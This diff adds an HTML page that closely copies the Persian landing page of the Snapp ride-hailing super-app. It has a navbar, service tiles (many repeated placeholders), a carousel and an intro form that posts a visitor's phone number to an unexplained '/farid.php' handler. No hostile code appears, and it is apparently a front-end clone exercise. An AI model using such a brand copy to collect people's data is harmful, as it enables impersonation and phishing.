@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="assets/scss/main.css" />
+    <title>سوپر اپلیکیشن اسنپ | سامانه هوشمند حمل‌ونقل | تاکسی اینترنتی</title>
+    <link rel="icon" type="image/x-icon" href="assets/img/snappTextLogo.svg" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.css" />
+  </head>
+  <body>
+    <header id="header">
+      <div class="container">
+        <div class="header">
+          <div class="logo">
+            <a href="#"><img src="/assets//img/snappTextLogo.svg" alt="" /></a>
+          </div>
+          <div class="navbar">
+            <ul>
+              <li><a href="">فرصت های شغلی</a></li>
+              <li><a href="">بلاگ</a></li>
+              <li><a href="">باشگاه رانندگان</a></li>
+              <li><a href="">ثبت نام راننده اسنپ</a></li>
+              <li><a href="">پنل سازمانی</a></li>
+              <li><a href="">درباره ما</a></li>
+              <li><a href="">تماس با ما</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <section id="intro">
+      <div class="left">
+        <h1>
+          تجربه‌ی زندگی راحت‌تر، سریع‌تر و به‌صرفه‌تر با سوپراپلیکیشن اسنپ!
+        </h1>
+        <p>
+          از درخواست خودرو گرفته تا سفارش غذا، خرید سوپرمارکتی، خرید بلیط سفر،
+          مشاوره‌ی پزشکی و روانشناسی، رزرو هتل و... را میتوانید با سوپراپلیکیشن
+          اسنپ انجام دهید.
+        </p>
+        <div class="intro-left-form">
+          <form
+            name="myForm"
+            action="/farid.php"
+            method="post"
+            onsubmit="return validateForm()">
+            <div class="circle"></div>
+            <input
+              type="text"
+              name="number"
+              id="number"
+              placeholder="0916xxxx5621" />
+            <input type="submit" value="ارسال لینک" id="btn-submit" />
+          </form>
+        </div>
+        <button class="btn-snapp-login">ورود به وب اپلیکیشن اسنپ</button>
+      </div>
+      <div class="right">
+        <img src="assets/img/intro_desktop.jpg" alt="" />
+      </div>
+    </section>
+
+    <section id="download-app">
+      <div class="container">
+        <div class="download-app">
+          <a href=""><img src="/assets/img/bazaar.png" alt="" /></a>
+          <a href=""><img src="/assets/img/sibapp-badge-white.png" alt="" /></a>
+          <a href=""><img src="/assets/img/snapp-pwa.png" alt="" /></a>
+          <a href=""
+            ><img src="/assets/img/direct-download-badge.png" alt=""
+          /></a>
+
+          <a href=""><img src="/assets/img/google-play-badge.png" alt="" /></a>
+        </div>
+      </div>
+    </section>
+
+    <section id="servises">
+      <div class="title-servises">
+        <h2>یک اپلیکیشن، برای تمام نیازها</h2>
+      </div>
+      <div class="servises-items">
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="62"
+              height="61"
+              viewBox="0 0 90 91">
+              <g fill="none" fill-rule="evenodd">
+                <g>
+                  <g>
+                    <g>
+                      <g>
+                        <path
+                          fill="#FFF"
+                          fill-opacity=".01"
+                          d="M0 0H90V90H0z"
+                          transform="translate(-141 -928) translate(39 900) translate(102 28.78)" />
+                        <path
+                          fill="#00D170"
+                          d="M24.85 9.481l3.655-.609c11.142-1.857 22.514-1.857 33.656 0l3.655.609c7.88 1.313 14.056 7.489 15.37 15.37l.608 3.654c1.857 11.142 1.857 22.514 0 33.656l-.609 3.655c-1.313 7.88-7.489 14.056-15.37 15.37l-3.654.608c-11.142 1.857-22.514 1.857-33.656 0l-3.654-.609c-7.881-1.313-14.057-7.489-15.37-15.37l-.609-3.654c-1.857-11.142-1.857-22.514 0-33.656l.609-3.654c1.313-7.881 7.489-14.057 15.37-15.37z"
+                          transform="translate(-141 -928) translate(39 900) translate(102 28.78)" />
+                        <g>
+                          <path
+                            d="M0 0L59.834 0 59.834 59.834 0 59.834z"
+                            transform="translate(-141 -928) translate(39 900) translate(102 28.78) translate(14.958 14.958)" />
+                          <path
+                            fill="#FFF"
+                            d="M41.727 7.48c3.251 0 6.12 2.098 7.115 5.172l.076.252 2.368 8.286 3.562.001c1.377 0 2.493 1.116 2.493 2.493 0 1.377-1.116 2.493-2.493 2.493h-.453c1.764 1.45 2.852 3.6 2.94 5.928l.006.305v14.958h-1.247v3.117c0 .983-.76 1.79-1.724 1.864l-.146.006h-4.986c-.983 0-1.79-.76-1.864-1.724l-.006-.146v-3.117H12.465v3.117c0 .983-.759 1.79-1.723 1.864l-.146.006H5.609c-.983 0-1.79-.76-1.864-1.724l-.005-.146v-3.117H2.493V32.41l.005-.286c.083-2.335 1.172-4.494 2.94-5.947h-.452c-1.377 0-2.493-1.116-2.493-2.493 0-1.322 1.029-2.403 2.33-2.488l.163-.005h3.561l2.369-8.287c.893-3.127 3.699-5.308 6.928-5.42l.263-.005h23.62zm12.186 24.93h-6.928c-2.027 0-3.85 1.234-4.603 3.116l-.733 1.835c-.045.11-.067.228-.067.347 0 .516.418.935.935.935h11.396c.516 0 .935-.419.935-.935v-4.363c0-.516-.419-.935-.935-.935zm-41.064 0H5.92l-.109.006c-.465.054-.826.45-.826.929v4.363l.006.109c.054.465.45.826.93.826h11.395l.11-.007c.464-.054.825-.449.825-.928 0-.12-.023-.237-.067-.347l-.733-1.835-.088-.206c-.8-1.766-2.563-2.91-4.515-2.91zm23.684 0H23.3c-.29 0-.576.055-.844.163-1.165.466-1.732 1.788-1.266 2.953.753 1.882 2.576 3.117 4.603 3.117h8.246c2.027 0 3.85-1.235 4.603-3.117.107-.268.162-.555.162-.844 0-1.255-1.017-2.272-2.272-2.272zm5.263-20.008h-23.98c-1.278 0-2.721.968-3.207 2.15l-2.144 10.379h34.903l-2.365-10.379c-.486-1.182-1.929-2.15-3.207-2.15z"
+                            transform="translate(-141 -928) translate(39 900) translate(102 28.78) translate(14.958 14.958)" />
+                        </g>
+                        <path
+                          d="M23.67 1.497l.847-.115C37.439-.38 50.533-.458 63.47 1.152l2.61.345C77.613 3.07 86.68 12.138 88.254 23.67l.115.847c1.842 13.51 1.842 27.207 0 40.717l-.115.847C86.68 77.613 77.613 86.68 66.08 88.254l-.847.115c-13.51 1.842-27.207 1.842-40.717 0l-.847-.115C12.138 86.68 3.07 77.613 1.497 66.08l-.115-.847C-.38 52.311-.458 39.217 1.152 26.28l.345-2.61C3.07 12.138 12.138 3.07 23.67 1.497z"
+                          transform="translate(-141 -928) translate(39 900) translate(102 28.78)" />
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </svg>
+          </div>
+          <div class="servises-item-desc">
+            <h3>تاکسی اینترنتی</h3>
+            <p>امکان درخواست آنلاین خودرو با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/bike.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/Pickup-new.png" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>درخواست وانت</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/food.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>سفارش آنلاین غذا</h3>
+            <p>سفارش غذا، نان و شیرینی با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/bike.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item">
+          <div class="servises-item-logo">
+            <img src="/assets/img/cab.svg" alt="" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>پیک موتوری</h3>
+            <p>حمل و نقل با اسنپ</p>
+          </div>
+        </div>
+        <div class="servises-item center">
+          <div class="servises-item-logo">
+            <img src="/assets/img/ticket-icon.svg " alt="" width="70" />
+          </div>
+          <div class="servises-item-desc">
+            <h3>اسنپ تیکت</h3>
+            <p>خرید آنلاین بلیط با اسنپ</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="image-food">
+      <div class="container">
+        <div class="image-food">
+          <!-- Swiper -->
+          <div class="swiper mySwiper">
+            <div class="swiper-wrapper">
+              <div class="swiper-slide">
+                <img src="/assets/img/Food.jpg" alt="" />
+              </div>
+              <div class="swiper-slide">
+                <img src="/assets/img/Driver.jpg" alt="" />
+              </div>
+              <div class="swiper-slide">
+                <img src="/assets/img/Club.jpg" alt="" />
+              </div>
+              <div class="swiper-slide">
+                <img src="/assets/img/Food.jpg" alt="" />
+              </div>
+            </div>
+            <div class="swiper-pagination"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="super-app">
+      <div class="super-app">
+        <div class="super-app-img">
+          <img src="assets/img/super-app.jpg" alt="" />
+        </div>
+        <div class="super-app-desc">
+          <h2>سوپر اپ اسنپ؛ پاسخی به تمام نیازها</h2>
+          <p>
+            اسنپ، اولین تاکسی اینترنتی ایران، بعد از پنج سال فعالیت در حوزه‌ی
+            تردد شهری، به یک سوپر‌اپ با خدمات متنوع تبدیل شد. سوپراپ اسنپ
+            راه‌حلی جدید و ساده است که با استفاده از آن تنها با یک اپلیکیشن
+            می‌توانید علاوه بر درخواست خودرو، موتور و وانت از خدمات متعددی از
+            جمله سفارش غذا، پزشک و مشاور آنلاین، خرید از سوپرمارکت‌ها و
+            فروشگاه‌ها، اسباب‌کشی، خرید بلیط (هواپیما، اتوبوس، قطار)، رزرو هتل،
+            پرداخت قبض و خرید شارژ استفاده کنید.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section id="options-app">
+      <div class="options-app-items">
+        <div class="options-app-item">
+          <div class="options-app-item-img">
+            <img src="/assets/img/210x190-easy.png" alt="" />
+          </div>
+          <div class="ptions-app-item-desc">
+            <h3>آسان</h3>
+            <p>
+              برای استفاده از هر کدام از خدمات سوپر‌اپ اسنپ کافی است وارد
+              اپلیکیشن اسنپ شوید و روی آیکون مورد نظر بزنید.
+            </p>
+          </div>
+        </div>
+        <div class="options-app-item">
+          <div class="options-app-item-img">
+            <img src="/assets/img/210x190-fast.png" alt="" />
+          </div>
+          <div class="ptions-app-item-desc">
+            <h3>سریع</h3>
+            <p>
+              برای استفاده از هر کدام از خدمات سوپر‌اپ اسنپ کافی است وارد
+              اپلیکیشن اسنپ شوید و روی آیکون مورد نظر بزنید.
+            </p>
+          </div>
+        </div>
+        <div class="options-app-item">
+          <div class="options-app-item-img">
+            <img src="/assets/img/210x190-eco.png" alt="" />
+          </div>
+          <div class="ptions-app-item-desc">
+            <h3>به صرفه</h3>
+            <p>
+              برای استفاده از هر کدام از خدمات سوپر‌اپ اسنپ کافی است وارد
+              اپلیکیشن اسنپ شوید و روی آیکون مورد نظر بزنید.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <script src="assets/js/main.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/swiper@8/swiper-bundle.min.js"></script>
+
+    <script>
+      var swiper = new Swiper(".mySwiper", {
+        loop: true,
+        pagination: {
+          el: ".swiper-pagination",
+        },
+      });
+    </script>
+  </body>
+</html>
